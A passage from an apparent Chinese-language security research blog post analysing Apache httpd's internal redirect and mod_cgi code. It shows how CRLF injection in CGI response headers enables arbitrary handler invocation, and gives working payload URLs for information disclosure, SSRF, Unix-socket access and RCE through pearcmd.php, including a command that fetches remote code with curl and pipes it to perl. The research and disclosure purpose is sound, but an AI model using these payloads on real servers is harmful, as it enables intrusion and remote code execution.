&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_scan_script_header_err_brigade_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;
                                                    &lt;span class=&quot;n&quot;&gt;APLOG_MODULE_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP_NOT_MODIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* This redirect needs to be a GET no matter what the original
         * method was.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* We already read the message body (if any), so don&apos;t allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apr_table_unset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;首先 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; 會先執行&lt;sup&gt;[1]&lt;/sup&gt; CGI 並掃描其輸出結果並設置上相對應的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;，如果&lt;sup&gt;[2]&lt;/sup&gt;回傳的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; 是 200 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; 標頭欄位是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 開頭則把這個回應當成一個伺服器端的轉址並開始處理&lt;sup&gt;[3]&lt;/sup&gt;。 再仔細審視 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_internal_redirect_handler()&lt;/code&gt; 的實作會發現：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800&quot;&gt;modules/http/http_request.c#L800&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;internal_internal_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ap_die was already called, if an error occured */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ap_set_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_process_request_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [4]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Httpd 首先創建&lt;sup&gt;[1]&lt;/sup&gt;了一個新的請求結構並將當前的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 複&lt;sup&gt;[2]&lt;/sup&gt;進去，在處&lt;sup&gt;[3]&lt;/sup&gt;完生命週期後呼叫&lt;sup&gt;[4]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; —— 也就是前面提及包含歷史遺留轉換的地方，所以&lt;strong&gt;在伺服器端轉址中，如果可以控制回應標頭，就可以在 Httpd 中呼叫任意的模組處理器。&lt;/strong&gt; 基本上所有 Apache HTTP Server 中的 CGI 系列實作都遵守這個行為，這裡是一個簡單的列表：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mod_cgi&lt;/li&gt;
  &lt;li&gt;mod_cgid&lt;/li&gt;
  &lt;li&gt;mod_wsgi&lt;/li&gt;
  &lt;li&gt;mod_uwsgi&lt;/li&gt;
  &lt;li&gt;mod_fastcgi&lt;/li&gt;
  &lt;li&gt;mod_perl&lt;/li&gt;
  &lt;li&gt;mod_asis&lt;/li&gt;
  &lt;li&gt;mod_fcgid&lt;/li&gt;
  &lt;li&gt;mod_proxy_scgi&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;至於如何在真實情境中觸發這個伺服器轉址呢？ 由於至少需要控制 HTTP 回應中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; 及部分 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;，這裡給出兩個情境以供參考：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;位於 CGI 回應標頭中的 CRLF Injection，透過換行去覆寫已存在的 HTTP 標頭&lt;/li&gt;
  &lt;li&gt;可完整控制回應標頭的 SSRF，例如託管在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_wsgi&lt;/code&gt; 上的 &lt;a href=&quot;https://django-revproxy.readthedocs.io/en/latest/&quot;&gt;django-revproxy&lt;/a&gt; 專案&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;接下來的範例都基於這個不安全的 CRLF Injection 來做示範：&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl &lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;m{^https?://}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Location: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$redir&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type: text/html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;️-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;✔️ 3-2-1. Arbitrary Handler to Information Disclosure&lt;/h5&gt;

&lt;p&gt;首先是從任意模組處理器呼叫到資訊洩漏，這裡使用了 Httpd 內建的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server-status&lt;/code&gt; 模組處理器，這個模組處理器通常只被允許從本機存取：&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /server-status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; server-status
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; local
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在擁有任意模組處理器呼叫後，可以透過複寫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; 去存取原本存取不到的敏感資訊：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:server-status&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/h5&gt;

&lt;p&gt;當然也能輕鬆的把一張圖片轉化成 PHP 後門，例如當使用者上傳了一個擁有合法副檔名的檔案後，可以透過這個攻擊手法指定特定模組 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; 去執行檔案內嵌的惡意程式碼，例如：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/uploads/avatar.webp&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:application/x-httpd-php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;️-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;✔️ 3-2-2. Arbitrary Handler to Full SSRF&lt;/h5&gt;

&lt;p&gt;呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 存取任何協議以及任意網址當然也不在話下，例如：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:http://example.com/%3f&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;另外這也是一個可以完整控制 HTTP 請求還有取得所有 HTTP 回應的 SSRF！ 稍微可惜的一點是在存取 Cloud Metadata 時會被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 會自動加上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt; 標頭導致被 EC2 及 GCP 的 &lt;a href=&quot;https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations&quot;&gt;Metadata 保護機制&lt;/a&gt;阻擋，否則這會是一個更強大的攻擊手法。&lt;/p&gt;

&lt;h5 id=&quot;️-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/h5&gt;

&lt;p&gt;然而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; 提供了一個更「方便」的功能 —— 可以存取本地的 Unix Domain Socket！ 😉&lt;/p&gt;

&lt;p&gt;這裡展示透過存取 PHP-FPM 本地的 Unix Domain Socket 去執行位於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt; 下的 PHP 後門：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;這個手法理論上還存在著更多的可能性，例如協議走私 (在 HTTP/HTTPS 協議間走私 FastCGI 😏) 或其它易受影響的 Local Sockets 等，這都交給有興趣的人繼續研究了。&lt;/p&gt;

&lt;h5 id=&quot;️-3-2-4-arbitrary-handler-to-rce&quot;&gt;✔️ 3-2-4. Arbitrary Handler to RCE&lt;/h5&gt;

&lt;p&gt;最後來展示一下如何透過一個常見的 CTF 小技巧把這個攻擊手法轉化成 RCE！ 由於 PHP 官方的 &lt;a href=&quot;https://hub.docker.com/_/php&quot;&gt;Docker 映像檔&lt;/a&gt; 在建構時引入了 PEAR 這套命令列 PHP 套件管理工具，透過其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pearcmd.php&lt;/code&gt; 作為入口點可以讓我們達成更進一步的利用，詳細的歷史及原理可以參考由 &lt;a href=&quot;https://x.com/phithon_xg&quot;&gt;Phith0n&lt;/a&gt; 撰寫的 &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&quot;&gt;Docker PHP LFI 總結文&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;這裡我們利用在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests&lt;/code&gt; 內的 Command Injection 來完成整個攻擊鏈，詳細的攻擊鏈如下：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/cgi-bin/redir.cgi?r=http:// %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php&lt;/em&gt;&lt;/strong&gt; %0d%0a &lt;br /&gt;
%0d%0a &lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;網路上經常在 Security Advisory 或 Bug Bounty 看到把 CRLF Injection 或 Header Injection 當成 XSS 報告，雖然確實有機會透過 SSO 串出 Account Takeover 等精彩漏洞，但請不要忘了它也能串出 Server-Side RCE，這個示範證明了它的可能！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

